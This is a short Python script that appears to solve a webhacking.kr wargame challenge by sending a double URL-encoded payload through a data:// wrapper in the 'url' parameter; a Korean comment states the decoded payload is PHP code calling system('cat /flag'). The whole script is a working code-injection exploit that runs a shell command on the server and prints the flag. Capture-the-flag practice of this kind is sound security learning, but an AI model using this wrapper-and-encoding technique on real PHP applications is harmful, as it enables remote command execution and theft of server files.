import requests

url = "http://webhacking.kr:10009/?"

def solve(): # payload -> <?php system('cat /flag');?> url encoding 두번
    payload = 'url=data://webhacking.kr:10009/,http://webhacking.kr:10009/%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%38%25%32%37%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%37%25%32%39%25%33%62%25%33%66%25%33%65'
    res = requests.get(url+payload)
    if "FLAG{" in res.text:
        print(res.text)

if __name__ == "__main__":
    solve()
